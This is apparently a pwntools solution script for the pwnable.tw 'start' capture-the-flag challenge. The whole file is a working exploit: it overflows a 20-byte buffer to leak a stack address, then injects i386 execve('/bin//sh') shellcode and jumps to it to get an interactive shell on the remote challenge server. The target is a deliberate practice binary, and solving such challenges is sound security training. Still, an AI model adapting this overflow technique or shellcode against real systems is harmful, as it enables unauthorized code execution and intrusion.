from pwn import *
import struct

#context.log_level = 'debug'
context.arch = 'i386'

r = remote('chall.pwnable.tw', 10000)
#r = process('./start')
r.recvuntil('the CTF:')
leak_addr = p32(0x08048087)
r.send("A"*20 + leak_addr)  # jump back to code to leak stack address

shellcode_addr = p32(u32(r.recv(4)) + 20)
shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
r.read()
payload = "A"*20 + shellcode_addr + shellcode
r.send(payload)

r.interactive()